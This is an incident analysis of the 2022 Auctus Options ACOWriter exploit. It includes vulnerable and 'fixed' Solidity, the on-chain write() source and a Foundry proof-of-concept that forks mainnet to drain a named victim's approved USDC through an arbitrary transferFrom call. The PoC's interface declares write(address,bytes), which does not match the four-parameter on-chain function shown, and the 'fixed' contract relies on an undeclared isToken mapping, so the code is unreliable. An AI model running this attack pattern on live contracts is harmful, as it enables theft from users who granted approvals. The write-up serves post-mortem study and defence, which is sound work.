# Auctus Options — Analysis of transferFrom Exploitation via Arbitrary Call

| Item | Details |
|------|------|
| **Date** | 2022-03-28 |
| **Protocol** | Auctus Options (ACO) |
| **Chain** | Ethereum Mainnet |
| **Loss** | Full USDC balance of victim (exact total undisclosed) |
| **Attacker** | Attacker address unidentified |
| **Victim** | [0xCB32033c498b54818e58270F341e5f6a3bce993B](https://etherscan.io/address/0xCB32033c498b54818e58270F341e5f6a3bce993B) |
| **Vulnerable Contract** | ACOWriter [0xE7597F774fD0a15A617894dc39d45A28B97AFa4f](https://etherscan.io/address/0xE7597F774fD0a15A617894dc39d45A28B97AFa4f) |
| **Root Cause** | The `write()` function allowed execution of arbitrary external calls, enabling an attacker to invoke USDC's `transferFrom()` on behalf of the contract and drain approved victim funds |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Auctus_exp.sol) |

---
## 1. Vulnerability Overview

The ACOWriter contract of Auctus Options provided a function for writing options. This `write()` function internally performed an external call that forwarded arbitrary calldata to an arbitrary contract address.

An attacker exploited this by calling `write()` with the USDC contract as the target and calldata crafted as `transferFrom(victim, attacker, balance)`. When the ACOWriter contract executed `transferFrom` on USDC, `msg.sender` became ACOWriter, allowing funds to be drained via the allowance the victim had previously granted to ACOWriter.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable ACOWriter.write() (pseudocode)
contract ACOWriter {

    // ❌ Allows forwarding arbitrary calldata to an arbitrary address
    function write(
        address target,      // attacker sets this to the USDC address
        bytes calldata data  // attacker sets this to transferFrom calldata
    ) external payable {
        // Executes external call with no target validation
        (bool success, ) = target.call{value: msg.value}(data);
        require(success, "write failed");
    }
}

// Attack calldata:
// data = abi.encodeWithSelector(
//     IERC20.transferFrom.selector,
//     victim,        // from: victim (address that approved ACOWriter)
//     attacker,      // to: attacker
//     victimBalance  // amount: victim's full balance
// )

// ✅ Correct pattern
contract ACOWriterFixed {
    // ✅ Manage only whitelisted function selectors
    mapping(bytes4 => bool) public allowedSelectors;

    function write(address target, bytes calldata data) external payable {
        bytes4 selector = bytes4(data[:4]);
        require(allowedSelectors[selector], "selector not allowed");
        // ✅ Never allow token contracts as target
        require(!isToken[target], "cannot call token contracts");
        (bool success, ) = target.call{value: msg.value}(data);
        require(success, "write failed");
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**ACOWriter.sol** — Entry point:
```solidity
// ❌ Root cause: `write()` function allows execution of arbitrary external calls, enabling invocation of USDC's `transferFrom()` to drain approved victim funds
    function write(  // ❌ Vulnerability
        address acoToken, 
        uint256 collateralAmount, 
        address exchangeAddress, 
        bytes memory exchangeData
    ) 
        nonReentrant 
        setExchange(exchangeAddress) 
        public 
        payable 
    {
        require(msg.value > 0,  "ACOWriter::write: Invalid msg value");
        require(collateralAmount > 0,  "ACOWriter::write: Invalid collateral amount");
        
        address _collateral = IACOToken(acoToken).collateral();
        if (_isEther(_collateral)) {
            IACOToken(acoToken).mintToPayable{value: collateralAmount}(msg.sender);
        } else {
            _transferFromERC20(_collateral, msg.sender, address(this), collateralAmount);
            _approveERC20(_collateral, acoToken, collateralAmount);
            IACOToken(acoToken).mintTo(msg.sender, collateralAmount);
        }
        
        _sellACOTokens(acoToken, exchangeData);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Confirm that victim (0xCB32033c...) has approved ACOWriter for USDC
    │       (query on-chain allowance)
    │
    ├─[2] Call ACOWriter.write() (send 1 wei)
    │       target = USDC contract address
    │       data   = abi.encode(transferFrom(victim, attacker, victim_balance))
    │
    ├─[3] ACOWriter → USDC.transferFrom() executes
    │       msg.sender = ACOWriter (the spender victim approved)
    │       from = victim
    │       to   = attacker
    │       amount = victim's full USDC balance
    │
    └─[4] Victim's entire USDC balance drained
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IACOWriter {
    // ⚡ Vulnerable function: target and data can be set arbitrarily by attacker
    function write(address target, bytes calldata data) external payable;
}

contract ContractTest is Test {
    IACOWriter acoWriter =
        IACOWriter(0xE7597F774fD0a15A617894dc39d45A28B97AFa4f);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address victim = 0xCB32033c498b54818e58270F341e5f6a3bce993B;
    address attacker = address(this);

    function setUp() public {
        vm.createSelectFork("mainnet", 14_460_635);
    }

    function testExploit() public {
        uint256 victimBalance = USDC.balanceOf(victim);
        emit log_named_decimal_uint("[Before] Victim USDC", victimBalance, 6);

        // ⚡ Core: execute USDC.transferFrom() through ACOWriter.write()
        // Exploits the state where ACOWriter has been granted allowance by the victim
        acoWriter.write{value: 1}(
            address(USDC),  // target: USDC contract
            abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                victim,         // from: victim (has already approved ACOWriter)
                attacker,       // to: attacker
                victimBalance   // amount: victim's full balance
            )
        );

        emit log_named_decimal_uint("[After] Attacker USDC", USDC.balanceOf(attacker), 6);
        emit log_named_decimal_uint("[After] Victim USDC", USDC.balanceOf(victim), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP DeFi** | Token Theft via Arbitrary Call |
| **Attack Vector** | write(USDC, transferFrom_calldata) |
| **Precondition** | Victim has approved ACOWriter for USDC |
| **Impact** | USDC theft possible from all users who have approved the contract |

---
## 6. Remediation Recommendations

1. **Prohibit arbitrary external calls**: Remove any logic that accepts a target address and calldata from user input for execution.
2. **Apply whitelisting**: Restrict calls to only approved contract addresses and function selectors.
3. **Block calls to token contracts**: Ensure that token contracts used directly by the protocol can never become targets of arbitrary calls.
4. **Minimize approvals**: Users should also avoid unlimited approvals and instead approve only the required amount as needed.

---
## 7. Lessons Learned

- **The danger of arbitrary calls**: If a contract can send arbitrary calldata to an arbitrary address, token theft is possible by exploiting allowances granted to that contract.
- **DEX aggregators such as LiFi and Paraswap**: The same vulnerability pattern has been found repeatedly across multiple DEX aggregators.
- **Allowance management**: Users should periodically revoke allowances for contracts they no longer use.